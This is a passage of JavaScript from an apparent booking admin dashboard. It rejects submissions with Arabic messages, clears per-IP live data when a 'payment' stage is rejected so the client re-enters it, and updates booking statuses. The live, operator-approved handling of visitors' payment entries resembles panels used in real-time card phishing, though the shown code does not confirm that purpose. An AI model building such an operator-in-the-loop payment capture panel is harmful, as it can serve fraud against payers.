    await fetch(`${SERVER_URL}/api/reject`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ requestId, message: 'تم الرفض' })
    });
  } catch(e) {
    if (socket) socket.emit('adminReject', { requestId, message: 'تم الرفض' });
  }

  // Gray out buttons, wait for client to re-enter data
  grayModalButtons(stage);

  // If payment rejected, clear all live data for this IP
  if (stage === 'payment') {
    delete liveData[ip];
    delete liveStatus[ip];
    updatePendingCount();
    updateRowStatus(ip, null);
  }
}

function grayModalButtons(stage) {
  const actionsEl = document.getElementById(`modal-actions-${stage}`);
  if (!actionsEl) return;
  actionsEl.querySelectorAll('.btn-modal-action').forEach(btn => {
    btn.className = 'btn-modal-action gray';
  });
}

function updateRowStatus(ip, status) {
  if (!ip) return;
  const rows = document.querySelectorAll(`tr[data-ip="${ip}"]`);
  rows.forEach(row => {
    const cell = row.querySelector('.live-status-cell');
    if (cell) {
      cell.innerHTML = status ? getLiveStatusBadge(ip, status) : '';
    }
    if (status) {
      row.classList.remove('row-live');
      void row.offsetWidth;
      row.classList.add('row-live');
      setTimeout(() => row.classList.remove('row-live'), 3000);
    }
  });
}

function closeModal() {
  document.getElementById('detailsModal').classList.remove('show');
  currentModalIp = null;
}

async function updateBookingStatus(bookingId, status) {
  try {
    await fetch(`${SERVER_URL}/api/bookings/${bookingId}/status`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ status })
    });
    closeModal();
    loadBookings();
  } catch(e) {
    console.error(e);
  }
}

// Close modal on overlay click
document.getElementById('detailsModal').addEventListener('click', function(e) {
  if (e.target === this) closeModal();
});
</script>
